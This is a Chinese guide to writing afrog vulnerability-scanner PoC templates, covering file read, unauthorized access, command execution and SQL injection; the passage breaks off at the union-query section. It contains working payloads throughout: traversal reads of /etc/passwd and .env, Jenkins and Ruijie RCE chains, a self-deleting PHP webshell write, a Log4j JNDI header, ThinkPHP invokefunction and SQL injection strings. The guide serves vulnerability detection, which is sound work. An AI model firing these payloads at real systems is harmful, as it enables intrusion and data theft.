<!--
title: 按漏洞类型的编写指南
slug: /docs/poc/category-guide
lang: zh
summary: 按漏洞类型沉淀 afrog PoC 的编写要点与可复制的典型示例，已完整收录文件读取类、未授权访问类、命令执行类、SQL 注入类、文件上传类与弱口令爆破类。
status: published
source: new
last_reviewed: 2026-09-23
-->

## 通用约定（各类型都适用）

### `path` 是怎么拼的

这一点直接决定你的 URL 会不会按预期发出：

- `path` 支持 `{{变量}}` 渲染
- 普通写法是「目标原有路径（去掉尾部 `/`）」+「`path`」
- `path` 以 `^` 开头表示**绝对路径**，会忽略目标自带的子路径，直接挂到主机根上，例如 `path: ^/index.php`
- 空格会被转义成 `%20`，`#` 会被转义成 `%23`
- `afrog` 不对 `..` 做归一化，`../` 会原样进入 URL，是否被解析取决于服务端

### 判定条件怎么写

1. 不要只判断 `response.status == 200`
2. 用带结构的锚点，避免 `root`、`admin`、`success` 这类通用词
3. 多锚点交叉：完整内容通常同时具备开头与结尾特征
4. 负向条件兜底：`!response.body.bcontains(b"<html")`、`!response_text.icontains("not found")`
5. 需要正则匹配中文或已解码内容时，优先用 `response_text` 系列函数（`rmatches`、`contains`）

### 通用坑

- **响应体上限**：`-mrbs` 默认 2 MB，超出部分会被截断，判定锚点应尽量落在内容开头附近
- **`requires` 门控**：加了 `requires` 后只有指纹命中的目标才会执行；`-nf`、`-test` 会绕过门控，别把它们当常规扫描模式
- **重定向**：需要跟随跳转时显式加 `follow_redirects`，否则可能只拿到 302 空响应
- **编码差异**：中文响应未必是 UTF-8，正则不中时先在字节层用 `bsubmatch` 试

## 文件读取类 (File Read)

### 命名与检索

社区通行做法是文件名与 `id` 以 `-fileread` 结尾、`tags` 里带上 `fileread`。真正决定能否被筛到的是 `tags`：`-s` 按 `id`、`name`、`tags` 匹配。内置语料里也有不以 `-fileread` 结尾的写法（如 `o2oa-open-read-file`、`ioffice-oa-iofileexport-read-file`、`CNVD-2018-16876`），它们同样靠 `tags` 被筛出。

```bash
afrog -t https://example.com -s fileread
```

### 读什么：常见落点与可用锚点

先确定要读哪个文件，再决定用它的什么特征做判定。优先选能直接证明危害的文件：

| 落点 | 说明 | 可用锚点 |
| --- | --- | --- |
| `/etc/passwd` | Linux 用户库，验证门槛最低 | `root:.*?:[0-9]*:[0-9]*:` |
| `C:/Windows/win.ini` | Windows 固定配置文件 | `for 16-bit app support`、`fonts`、`extensions` |
| `WEB-INF/web.xml` | Java 应用部署描述 | `<web-app`、`</web-app>` |
| `WEB-INF/classes/application.yml` | Spring 配置 | `spring:`、`datasource` |
| `.env` | 环境变量，常含密钥 | `APP_KEY=`、`DB_PASSWORD=` |
| `.git/config` | 源码仓库配置 | `[core]`、`repositoryformatversion` |
| `C:/Windows/System32/drivers/etc/hosts` | Windows hosts | `localhost`、`127.0.0.1` |
| `/root/.bash_history` | 运维命令历史 | `cd `、`sudo ` |

Linux 用户库：

```yaml
id: demo-linux-fileread

info:
  name: 示例 Linux 任意文件读取
  author: your-name
  severity: high
  tags: demo,fileread

rules:
  r0:
    request:
      method: GET
      path: /download?filename=../../../../etc/passwd
    expression: |
      response.status == 200 &&
      "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
```

Windows 配置文件。首行 `for 16-bit app support` 是语料里最通用的锚点，再叠加 `fonts`、`extensions` 做交叉校验：

```yaml
id: demo-windows-fileread

info:
  name: 示例 Windows 任意文件读取
  author: your-name
  severity: high
  tags: demo,fileread

rules:
  r0:
    request:
      method: GET
      path: /download?filename=c:/windows/win.ini
    expression: |
      response.status == 200 &&
      response.body.bcontains(b"for 16-bit app support") &&
      response.body.bcontains(b"fonts") &&
      response.body.bcontains(b"extensions")
expression: r0()
```

Java 应用配置，靠 XML 标签成对出现确认读到了完整文件：

```yaml
id: demo-webxml-fileread

info:
  name: 示例 Java 应用配置读取
  author: your-name
  severity: medium
  tags: demo,fileread

rules:
  r0:
    request:
      method: GET
      path: /static/../WEB-INF/web.xml
    expression: |
      response.status == 200 &&
      response.body.bcontains(b"<web-app") &&
      response.body.bcontains(b"</web-app>")
expression: r0()
```

敏感文件：

```yaml
id: demo-env-fileread

info:
  name: 示例 .env 读取
  author: your-name
  severity: critical
  tags: demo,fileread

rules:
  r0:
    request:
      method: GET
      path: /static/../.env
    expression: |
      response.status == 200 &&
      response.body.bcontains(b"APP_KEY=") &&
      !response.body.bcontains(b"<html")
expression: r0()
```

### 从哪读：入口形态

文件读取的「入口」通常只有四种形态，先判断这条漏洞属于哪一种，再决定怎么写：

#### 1. URL 路径穿越

把穿越序列直接写在 URL 路径里。不同实现对编码的处理差别很大，通常按顺序多试几种：

- 穿越深度不足时加层级：`../../../../`
- 单次编码：`..%2f`、`%2e%2e%2f`
- 双次编码：`..%252f`、`%252e%252e%252f`
- 过滤 `../` 时改用 `....//`、`..//`、`.../.../`
- 绝对路径：直接给 `/etc/passwd`，或用 `path: ^/...` 忽略目标子路径
- 分隔符与盘符变体：`\`、`%5c`、`c:/`

```yaml
id: demo-traversal-fileread

info:
  name: 示例 穿越与编码绕过
  author: your-name
  severity: high
  tags: demo,fileread

rules:
  r0:
    request:
      method: GET
      path: /download?filename=../../../../etc/passwd
    expression: |
      response.status == 200 &&
      "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  r1:
    request:
      method: GET
      path: /download?filename=..%2f..%2f..%2f..%2fetc%2fpasswd
    expression: |
      response.status == 200 &&
      "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  r2:
    request:
      method: GET
      path: /download?filename=....//....//....//....//etc/passwd
    expression: |
      response.status == 200 &&
      "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0() || r1() || r2()
```

把同一落点的多个变体拆成多条规则、用 `r0() || r1() || ...` 组合，比把所有写法塞进一条规则更容易定位是哪一种生效。

#### 2. query 参数

「下载 / 导出」类接口常把文件路径做成查询参数，例如 `?url=/etc/passwd`、`?filename=test.txt`：

```yaml
    request:
      method: GET
      path: /iOffice/prg/set/iocom/ioFileExport.aspx?url=/etc/passwd&filename=test.txt
    expression: |
      response.status == 200 &&
      "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
```

#### 3. body 参数

表单或 JSON 传路径，例如 `templateUrl=/etc/passwd`、`{"fileName":"../../../etc/passwd"}`：

```yaml
id: demo-param-fileread

info:
  name: 示例 参数型文件读取
  author: your-name
  severity: high
  tags: demo,fileread

rules:
  r0:
    request:
      method: POST
      path: /api/export/read
      headers:
        Content-Type: application/json; charset=UTF-8
      body: |
        {"fileName":"../../../etc/passwd"}
    expression: |
      response.status == 200 &&
      "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
```

如果接口要求先登录，可以用前一条规则拿到 token、通过 `output` 传给后续规则，写法见 [PoC 语法参考](./02-syntax.md) 的 `output` 章节。

#### 4. raw

当 `path` 的拼接、转义或默认请求头会干扰验证时，直接用 `raw` 手写报文。官方语料里就有用 `.//` 规避路径规范化的写法：

```yaml
id: demo-raw-fileread

info:
  name: 示例 raw 读 web.xml
  author: your-name
  severity: medium
  tags: demo,fileread

set:
  hostname: request.url.host

rules:
  r0:
    request:
      raw: |
        GET .//WEB-INF/web.xml HTTP/1.1
        Host: {{hostname}}
        User-Agent: Mozilla/5.0
    expression: |
      response.status == 200 &&
      response.body.bcontains(b"<web-app") &&
      (response.raw_header.bcontains(b"application/xml") || response.raw_header.bcontains(b"text/xml"))
expression: r0()
```

### 本类降误报要点

文件读取最大的误报来源是「回显了一个 200 的错误页」，几条本类经验：

1. 用文件**自身结构**做锚点，而不是文件名或通用词：`root:.*?:[0-9]*:[0-9]*:`、`[core]`、`APP_KEY=`
2. 完整文件通常一头一尾都有特征，尽量成对匹配：`<web-app` + `</web-app>`
3. 不确定响应是不是页面时，加一条负向条件：`!response.body.bcontains(b"<html")`
4. 锚点尽量落在文件开头附近，避免被 `-mrbs` 截断（见通用坑）

## 未授权访问类 (Unauthorized Access)

### 命名与检索

命名通行做法是文件名与 `id` 以 `-unauth` 结尾，也常见 `-unauthorized`、`-unauthorized-access`、`-unauthenticated` 等变体；`tags` 里带上 `unauth` 或 `unauthorized`（两种都在用）。和文件读取类一样，决定能否被 `-s` 筛到的是 `tags`。

```bash
afrog -t https://example.com -s unauth
```

### 先分流：HTTP 端点还是网络服务

这一类的写法取决于目标是什么，先做这个判断再动笔：

| 形态 | 目标 | 请求写法 | 判定对象 |
| --- | --- | --- | --- |
| HTTP 端点未授权 | 管理面板、监控页、配置 / 用户接口 | 普通 HTTP 请求，常配合候选路径枚举 | `response.body`、`response.headers` |
| 网络服务未授权 | Redis、Memcached、Zookeeper 等 | `type: tcp` 直连端口发协议报文 | `response.raw` |

### HTTP 端点：候选路径枚举

这类接口的路径往往不固定（不同部署挂了不同的 base path），所以最常见的写法是用 `brute` 枚举一组候选路径。内置 PoC `springboot-actuator-unauth`：

```yaml
id: springboot-actuator-unauth

info:
  name: Springboot Actuator Unauth
  author: ffffffff0x
  severity: high
  verified: true
  reference:
    - https://github.com/LandGrey/SpringBootVulExploit
  tags: actuator,springboot,unauth
  created: 2023/07/07

rules:
  r0:
    brute:
      mode: sniper
      commit: winner
      continue: false
      p:
        - /env
        - /appenv
        - /env%72
        - /appenv%72
        - ;;/env;.css
    request:
      method: GET
      path: "{{p}}"
    expression: |
      response.status == 200 &&
      response.content_type.contains("json") &&
      response.body.bcontains(b"java.version") &&
      response.body.bcontains(b"os.arch")
  r1:
    brute:
      mode: sniper
      commit: winner
      continue: false
      p:
        - /actuator
        - /api/actuator
        - /prod-api/actuator
        - /actuato%72
    request:
      method: GET
      path: "{{p}}"
    expression: |
      response.status == 200 &&
      response.body.bcontains(b'"_links":') &&
      response.body.bcontains(b'"env":') &&
      response.body.bcontains(b'"heapdump":')
expression: r0() || r1()
```

值得照抄的三点：

- `path: "{{p}}"` 配合 `brute` 的候选列表，一条规则覆盖全部路径变体
- 候选列表里同时放两类绕过写法：编码（`/actuato%72`）、分号路径参数（`;;/env;.css`）
- 同一接口的不同 base path 一并列入（`/actuator`、`/api/actuator`、`/prod-api/actuator`）

关于 `brute` 的三个字段：当前实现只对 `pitchfork` 做特殊处理，其余取值（包括语料里常见的 `sniper`）都按默认的 `clusterbomb` 走；只有一个候选变量时，这几种写法效果一致。组合语义详见 [brute 机制](./05-brute.md)。

### HTTP 端点：判定怎么写

这一类最大的误报是「把公开页面当成未授权接口」，所以判定要同时锁定两件事：**它是个接口**，而且**吐出了不该公开的数据**。内置 PoC `nacos-user-list-unauthorized`：

```yaml
id: nacos-user-list-unauthorized

info:
  name: Alibaba Nacos V1 Auth Bypass
  author: kmahyyg
  severity: high
  verified: true
  tags: alibaba,nacos,unauth
  created: 2023/07/07

rules:
  r0:
    request:
      method: GET
      path: /nacos/v1/auth/users?pageNo=1&pageSize=9
      headers:
        User-Agent: Nacos-Server
    expression: |
      response.status == 200 &&
      response.headers["content-type"].contains("application/json") &&
      response.body.bcontains(b'"username":') &&
      response.body.bcontains(b'"password":')
  r1:
    request:
      method: GET
      path: /v1/auth/users?pageNo=1&pageSize=9
      headers:
        User-Agent: Nacos-Server
    expression: |
      response.status == 200 &&
      response.headers["content-type"].contains("application/json") &&
      response.body.bcontains(b'"username":') &&
      response.body.bcontains(b'"password":')
expression: r0() || r1()
```

要点：

- 先用 `response.content_type.contains("json")` 或 `response.headers["content-type"].contains(...)` 限定响应类型
- 锚点选**只有该接口才会出现**的字段名：`"username":` + `"password":`、`"kubeletVersion"`、`"links":` + `"attributes"`

### HTTP 端点：认证绕过的附加条件

有些「未授权」其实是特定条件触发的鉴权绕过，请求里必须带上那个条件，否则打不出来：

- 特定 User-Agent：例如上面 Nacos 的绕过依赖 `User-Agent: Nacos-Server`
- 特定查询参数：例如 Joomla CVE-2023-23752 的 `?public=true`
- 特定路径写法：分号路径参数 `;.css`、编码后的路径

写这类 PoC 时，把触发条件当作漏洞的一部分写进请求，不要拆成两条规则。

### 网络服务：TCP 直连

数据库、缓存、中间件这类服务没有 HTTP 接口，直接按协议发报文。内置 PoC `redis-unauthorized`：

```yaml
id: redis-unauthorized

info:
  name: Redis Unauthorized
  author: zan8in
  severity: high
  verified: true
  reference:
    - https://developer.aliyun.com/article/515894
  tags: network,redis,unauthorized
  created: 2024/01/16

set:
  hostname: request.url.host
  host: request.url.domain

rules:
  r0:
    request:
      type: tcp
      host: "{{hostname}}"
      data: "*1\r\n$4\r\ninfo\r\n"
    expression: |
      response.raw.bcontains(b"redis_version") ||
      response.raw.bcontains(b"72656469735f76657273696f6")
  r1:
    request:
      type: tcp
      host: "{{host}}:6379"
      data: "*1\r\n$4\r\ninfo\r\n"
    expression: |
      response.raw.bcontains(b"redis_version") ||
      response.raw.bcontains(b"72656469735f76657273696f6")
expression: r0() || r1()
```

要点：

- 先在 `set` 里取 `request.url.host` / `request.url.domain`，再拼出 `host`
- 用两条规则分别覆盖「目标原端口」与「服务默认端口」（`{{host}}:6379`）
- 判定用 `response.raw`，并同时匹配明文与编码形式（上面那串 hex 就是 `redis_version` 的十六进制，用于应对响应带编码的情况）

换协议时思路不变，只改 `data` 与端口：Memcached 发 `stats`、Zookeeper 发 `mntr` / `envi` 等。

### 未授权 → 进一步利用

未授权经常只是起点，后面会接提取凭据、执行命令等步骤。这类多阶段 PoC 用 `output` 把上一步拿到的东西传给下一步。内置 PoC `jenkins-unauthorized-rce`：

```yaml
id: jenkins-unauthorized-rce

info:
  name: Jenkins unauthorized rce
  author: MrP01ntSun
  severity: critical
  verified: true
  tags: jenkins,rce,unauth
  created: 2023/07/07

set:
  r1: randomInt(1000, 9999)
  r2: randomInt(1000, 9999)

rules:
  r0:
    request:
      method: GET
      path: /script
    expression: response.status == 200
    output:
      search: '"\"Jenkins-Crumb\", \"(?P<var>.+?)\"\\);".bsubmatch(response.body)'
      var: search["var"]
  r1:
    request:
      method: POST
      path: /script
      body: |
        script=printf%28%27{{r1}}%25%25{{r2}}%27%29%3B&Jenkins-Crumb={{var}}&Submit=%E8%BF%90%E8%A1%8C
    expression: |
      response.status == 200 &&
      response.body.bcontains(bytes(string(r1) + "%" + string(r2)))
expression: r0() && r1()
```

要点：

- `r0` 只负责拿到 `Jenkins-Crumb`，并通过 `output` 暴露给后续规则
- 顶层 `expression: r0() && r1()`：两步都成立才算命中
- 要证明「命令真的执行了」时，用 `set: r1/r2: randomInt(...)` 生成随机数，让响应回显这个**不可预测值**——比匹配固定回显稳定得多

### 本类降误报要点

1. 「接口能打开」不等于「未授权」：优先证明拿到了敏感数据（用户列表、配置、密钥、命令回显）
2. 用 `content_type` 加该接口特有的字段名做锚点，别用通用词
3. 网络服务类要确认应答真来自该服务：匹配协议特征串（`redis_version`）而不是通用文本
4. 多阶段 PoC 用 `&&` 串起来，避免「第一步能访问、第二步没成功」也算命中
5. 鉴权绕过类必须把触发条件（特定 Header、特定参数）写进请求，否则会时灵时不灵

## 命令执行类 (RCE)

### 命名与检索

命名通行做法是文件名与 `id` 以 `-rce` 结尾，遇到具体形态时会在中间加限定词，例如 `-ping-rce`、`-cli-rce`、`-jndi-rce`、`-deserialization-rce`；`tags` 里带上 `rce`，并额外标注组件（`log4j`、`fastjson`、`thinkphp`）或漏洞类型（`jndi`、`deserialization`）。

```bash
afrog -t https://example.com -s rce
```

### 先分流：证据从哪里来

这一步决定整条 PoC 的骨架，比选字段重要得多：

| 形态 | 证据来源 | 判定写法 |
| --- | --- | --- |
| 回显型 | 响应正文里直接带回命令输出 | 用**不可预测值**证明 |
| 写入型 | 先写文件 / webshell，再回读 | 两步用 `&&` 串联 |
| 无回显型 | 目标回连 OOB 平台 | `oobCheck("dns", 5)` |
| 反序列化 / 表达式注入 | 多数无回显，少数能回显 | 无回显走 OOB；有回显同「回显型」 |

### 回显型：用不可预测值证明

能直接看到命令输出时，**不要匹配 `uid=0(root)`、`whoami`、`www-data` 这类固定串**——它们在错误页、静态文件里也可能出现。正确做法是让目标回显一个你随机生成的、只有真执行了才可能出现的结果。内置 PoC `ruijie-eg-cli-rce`：

```yaml
id: ruijie-eg-cli-rce

info:
  name: ruijie-eg-cli-rce
  author: Jarcis
  severity: high
  verified: true
  tags: ruijie,cli,rce
  created: 2023/08/13

set:
  r1: randomInt(8000, 10000)
  r2: randomInt(8000, 10000)

rules:
  r0:
    request:
      method: POST
      path: /login.php
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        username=admin&password=admin?show+webmaster+user
    expression: response.status == 200 && response.content_type.contains("text/json")
    output:
      search: '"{\"data\":\".*admin\\s?(?P<password>[^\\\\\"]*)".bsubmatch(response.body)'
      password: search["password"]
  r1:
    request:
      method: POST
      path: /login.php
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        username=admin&password={{password}}
    expression: |
      response.status == 200 &&
      response.content_type.contains("text/json") &&
      response.headers["set-cookie"].contains("user=admin") &&
      response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
  r2:
    request:
      method: POST
      path: /cli.php?a=shell
      body: |
        notdelay=true&command=expr {{r1}} * {{r2}}
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
expression: r0() && r1() && r2()
```

要点：

- `set` 生成两个随机整数，命令里让目标算 `expr {{r1}} * {{r2}}`，再校验乘积 `bytes(string(r1 * r2))`
- 乘积不可预测，能匹配上基本就说明命令真的被执行了
- 三段式：先绕过登录拿密码（`output` 传递），再验证登录成功，最后执行并证明
- `bytes(...)` 把字符串转成字节流，才能和 `bcontains` 搭配

### 双平台覆盖：按需挑选手法，不必全写

命令注入能用的命令取决于目标系统：Windows 有 `set /A`、`type`，Linux 有 `expr`、`bc`、`cat`。下面五种是**可以互相替代的验证手法**，按目标环境挑一两条就够。

它们共用同一套头部与随机变量：

```yaml
info:
  name: 示例 命令注入检测
  author: your-name
  severity: critical
  tags: demo,rce

set:
  s1: randomInt(800000000, 1000000000)
  s2: randomInt(800000000, 1000000000)
```

下列片段各是一条规则，与上面的头部拼起来就是完整 PoC。

#### 手法一：Linux 算术证明（首选）

```yaml
  r0:
    request:
      method: POST
      path: /test
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        id=expr {{s1}} - {{s2}}
    expression: response.status == 200 && response.body.bcontains(bytes(string(s1 - s2)))
```

#### 手法二：Linux 算术证明（`expr` 不存在时的兜底）

```yaml
  r1:
    request:
      method: POST
      path: /test
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        id=echo {{s1}}-{{s2}}|bc
    expression: response.status == 200 && response.body.bcontains(bytes(string(s1 - s2)))
```

#### 手法三：Windows 算术证明

```yaml
  r2:
    request:
      method: POST
      path: /test
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        id=set /A {{s2}}-{{s1}}
    expression: response.status == 200 && response.body.bcontains(bytes(string(s2 - s1)))
```

#### 手法四：Linux 文件读取证明

```yaml
  r3:
    request:
      method: POST
      path: /test1
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        id=cat /etc/passwd
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
```

#### 手法五：Windows 文件读取证明

```yaml
  r4:
    request:
      method: POST
      path: /test2
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        id=type c:/windows/win.ini
    expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
```

#### 怎么组合最省请求

| 场景 | 建议留下 | 未命中该漏洞时的请求数 |
| --- | --- | --- |
| 已知目标平台 | 该平台的 1 条算术证明 | 1 |
| 平台不确定 | Windows + Linux 各 1 条算术证明 | 2 |
| 还想证明「能读到文件」 | 算术证明 + 同平台的文件读取证明 | 2 |
| 五种全写 | 不推荐 | 5 |

关键在于：**规则条数就等于「目标不存在该漏洞」时的请求数**——而扫到的大多数目标都是这种情况。`||` 加命中即停只在**命中**时省请求，未命中时每条规则都会跑一遍。所以不要把「更严谨」等同于「全写上」。

内置 PoC `yonyou-nc-uploadservlet-rce` 就是上面「平台不确定」的做法：只写 Windows 和 Linux 两条算术证明（一条 `set /A`、一条 `expr`），用 `||` 串起来，把结果放进响应头里匹配。

#### 写法要点

- **算术证明必须是随机的**：`bytes(string(...))` 先把算式结果转成字符串、再转字节，才能和 `response.body`（bytes）比较；减法方向与校验表达式一致即可
- **随机数取 9~10 位区间**：判定是子串匹配，四位数容易被响应里的时间戳、ID 碰巧命中；取大区间还能顺带避开结果退化成 `0` 或个位数
- **文件读取证明的锚点**直接复用文件读取类的结论：`for 16-bit app support`（`win.ini` 首行）、`root:.*?:[0-9]*:[0-9]*:`（passwd）
- **别用固定回显**（`whoami`、`uid=0(root)`、`www-data`）：它们可能来自错误页、静态文件或站点模板
- **命中即停**：把选中的手法用 `||` 串在顶层 `expression` 里，命中后不再发后续请求

### 写入型：先落文件再回读

命令注入常用来写 webshell 或落地文件，这类必须**回读验证**，不能因为「请求成功」就判定命中。内置 PoC `amtt-eflow-hsia-server-ping-rce`：

```yaml
id: amtt-eflow-hsia-server-ping-rce

info:
  name: Amtt eflow Hsia Server Ping RCE
  author: YekkoY
  severity: high
  verified: false
  tags: amtt,eflow,hsia,rce
  created: 2023/10/25

set:
  r2: randomLowercase(10)

rules:
  r0:
    request:
      method: GET
      path: /manager/radius/server_ping.php?ip=127.0.0.1|echo%20"<?php%20echo%20md5({{r2}});unlink(__FILE__);?>">../../{{r2}}.php&id=1
    expression: response.status == 200 && response.body.bcontains(b"parent.doTestResult")
  r1:
    request:
      method: GET
      path: /{{r2}}.php
    expression: response.status == 200 && response.body.bcontains(bytes(md5(r2)))
expression: r0() && r1()
```

要点：

- 随机文件名（`randomLowercase(10)`）避免互相覆盖、也不易被猜中
- 回读时校验内容哈希 `bytes(md5(r2))`，确认取回的是自己写进去的那个文件
- 示例里的 `unlink(__FILE__)` 让马执行一次即自删，降低对目标的影响
- 判定的两组锚点分工明确：`r0` 证明「命令被执行了」，`r1` 证明「文件真的落地了」

### 无回显型：走 OOB

JNDI、反序列化这类通常没有任何回显，只能靠目标的回连确认。注入点可以是 header、query 或 body，判定统一交给 `oobCheck`：

```yaml
id: demo-log4j-oob-rce

info:
  name: 示例 Log4j JNDI 无回显检测
  author: your-name
  severity: critical
  tags: demo,rce,jndi,log4j

rules:
  r0:
    request:
      method: GET
      path: /websso/SAML2/SSO/vsphere.local?SAMLRequest=
      headers:
        X-Forwarded-For: "${jndi:ldap://{{oob.DNS}}/a}"
    expression: oobCheck("dns", 5)
expression: r0()
```

要点：

- 注入点常放在 header（`X-Forwarded-For`、`User-Agent`、`Cookie`）或 body 的 JSON 字段里
- 命令注入类则常放 query，用 `;`、`|`、`$()` 拼接，例如 `?cid=1&nid=;ping%20{{oob.DNS}};`
- 判定用新版语法 `oobCheck("dns", 5)` / `oobCheck("http", 3)`
- 不要再写 v2 旧写法（`set: oob: oob()`、`{{oobDNS}}`、`oobCheck(oob, ...)`）：这类会被识别为 legacy OOB 并**跳过加载**
- OOB 平台要先在 [配置文件说明](../user-guide/05-configuration.md) 里配好，细节见 [OOB 带外检测](./06-oob.md)

### payload 变体枚举

同一个漏洞在不同部署下，路由前缀、可用函数、编码方式都可能不同，所以 payload 往往要成组试。这时用 `brute` 做多变量组合（默认 `clusterbomb` 笛卡尔积）。内置 PoC `thinkphp-5022-5129-rce`：

```yaml
id: thinkphp-5022-5129-rce

info:
  name: Thinkphp 5.0.22&5.1.29 RCE
  author: zan8in
  severity: critical
  verified: true
  tags: thinkphp,rce
  created: 2025/10/27

rules:
  r0:
    brute:
      mode: clusterbomb
      commit: winner
      continue: false
      s:
        - index
        - manage
        - admin
      p:
        - "/?s=/{{s}}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
        - "/?s=/{{s}}/\\think\\view\\driver\\php/display&content=<?php%20phpinfo();?>"
    request:
      method: GET
      path: "{{p}}"
    expression: |
      response.status == 200 &&
      response.body.bcontains(b'PHP Extension') &&
      response.body.bcontains(b'PHP Version') &&
      r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
expression: r0()
```

要点：

- 两个变量 `s`（路由前缀）与 `p`（payload 变体）做全组合，一条规则覆盖多种部署
- 判定挑「只有命令真的执行了才会出现」的特征，例如 phpinfo 页面的 `PHP Extension` + `PHP Version`，再加正则确认版本号格式
- 命中即停（`commit: winner` + `continue: false`）能省掉大量无谓请求

### 本类降误报要点

1. 固定回显（`uid=0`、`whoami` 结果）不可信，一律用随机值 / 随机算术 / 哈希来证明
2. 写入型必须回读校验，只看到「写文件请求返回 200」不算命中
3. 无回显型必须走 OOB；不要用「状态码 200」或「响应变慢」这类弱条件硬判
4. 多阶段用 `&&` 串起来，避免「登录成功但没执行命令」也被算作命中
5. payload 的编码差异要连同漏洞本身一起写清楚（`%20`、`%24(`、`%0D%0A`、双重编码），否则换个目标就失效

## SQL 注入类 (SQL Injection)

### 命名与检索

命名通行做法是文件名与 `id` 以 `-sqli` 结尾；也见 `-sqlinject`、`-sql-injection`、`-sqi` 等变体。`tags` 里带上 `sqli`（少数写成 `sql`）。

内置语料里这一类主要落在 `afrog-pocs/vulnerability/`，另有部分在 `CVE/`、`CNVD/`、`disclosure/` 下。

```bash
afrog -t https://example.com -s sqli
```

### 先分流：结果从哪里读出来

SQL 注入的判定完全取决于「数据库的输出以什么形式回到响应里」：

| 类型 | 证据形式 | 判定依赖 | 请求数 |
| --- | --- | --- | --- |
| 报错注入 | 数据库把结果拼进报错信息 | 响应正文里的随机值 / 报错关键字 | 1 |
| 联合查询 | 查询结果直接回显在页面 | 响应正文里的版本号、用户名等 | 1 |
| 时间盲注 | 响应耗时的变化 | `response.latency` | 2 条起 |
| 布尔盲注 | 两种输入下响应不同 | 响应正文 / 状态码差异 | 2 条起 |

**优先选前两种**：一次请求就能拿到确凿证据，误报也低。只有前两种都打不通时，再考虑盲注——盲注天生需要对照，请求数一定更多。

### 报错注入：让数据库把随机值吐出来

`extractvalue` / `updatexml` 在遇到非法 XPath 时会把「非法内容」拼进报错信息，于是可以把查询结果当成报错读出来。最省请求的写法是直接让报错里带上一个随机数。内置 PoC `xdcms-sqli`：

```yaml
id: xdcms-sqli

info:
  name: Xdcms sqli
  author: amos1
  severity: high
  verified: false
  tags: xdcms,sqli
  created: 2025/03/13

set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)

rules:
  r0:
    request:
      method: POST
      path: /index.php?m=member&f=login_save
      body: |
        username=dd' or extractvalue(0x0a,concat(0x0a,{{r1}}*{{r2}}))#&password=dd&submit=+%B5%C7+%C2%BC+
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
expression: r0()
```

要点：

- 一条规则、一次请求就够：注入 `{{r1}}*{{r2}}`，判定响应里是否出现乘积
- `0x0a` 是换行符，`concat(0x0a, ...)` 用于把结果拼进报错
- `#` 是 MySQL 的注释符，用来吃掉原语句后面的内容

内置 PoC `springblade-blade-user-list-sqli` 是同一思路的另一种锚点，用 `md5` 而不是乘积：

```yaml
    expression: response.status == 500 && response.body.bcontains(b'XPATH syntax error:') && response.body.bcontains(bytes(substr(md5(string(rand1)), 0, 31)))
```

这里有两处容易被忽略的细节：

- **报错回显有长度限制**：32 位的 md5 会被截断，所以只匹配前 31 位（`substr(md5(...), 0, 31)`），直接匹配完整 md5 反而永远不中
- **报错注入常伴随 5xx**：该 PoC 判的是 `response.status == 500`，不要习惯性只写 200

### 时间盲注：让耗时随注入的延时值变化

关键不是「猜一次有没有超时」，而是**在同一注入点交替投入两个不同的延时值，看耗时是否各自跟着变**。内置 PoC `jinher-c6-rssmoduleshttp-sqli`：

```yaml
id: jinher-c6-rssmoduleshttp-sqli

info:
  name: 金和OA RssModulesHttp.aspx接口SQL注入
  author: zan8in
  severity: high
  verified: true
  reference:
    - https://mp.weixin.qq.com/s/RM0gZfnSs4hsGa6MerqDog
  tags: jinher,sqli
  created: 2024/02/21

rules:
  r0:
    request:
      method: GET
      path: /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:10%27--
    expression: response.status == 200 && response.latency <= 12000 && response.latency >= 10000
  r1:
    request:
      method: GET
      path: /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:6%27--
    expression: response.status == 200 && response.latency <= 8000 && response.latency >= 6000
  r2:
    request:
      method: GET
      path: /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:10%27--
    expression: response.status == 200 && response.latency <= 12000 && response.latency >= 10000
  r3:
    request:
      method: GET
      path: /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:6%27--
    expression: response.status == 200 && response.latency <= 8000 && response.latency >= 6000
expression: r0() && r1() && r2() && r3()
```

（示例省略了原文件里与判定无关的 `extractors` 块。）

要点：

- **必须交替两个延时值**（这里 10 → 6 → 10 → 6）：只有当耗时确实由注入参数控制，才会出现「投 10 秒就慢、投 6 秒就快」的规律。只测一次落在某个区间说明不了问题——目标本身就慢、或赶上一次网络抖动，都会得到同样的结果。这正是这类 PoC 看上去在「重复发请求」的原因，它不是冗余
- **区间取「延时值 + 约 2 秒」**：投 6 秒判 `6000~8000`，投 10 秒判 `10000~12000`，给网络与调度抖动留空间
- **延时函数按数据库选**：SQL Server 用 `WAITFOR DELAY '0:0:10'`，MySQL 用 `SLEEP(10)`，PostgreSQL 用 `pg_sleep(10)`
- **顶层用 `&&` 串联**：每一轮都要落在对应区间才算命中。时间盲注的请求条数，是它换取准确率必须付出的成本

### 联合查询回显

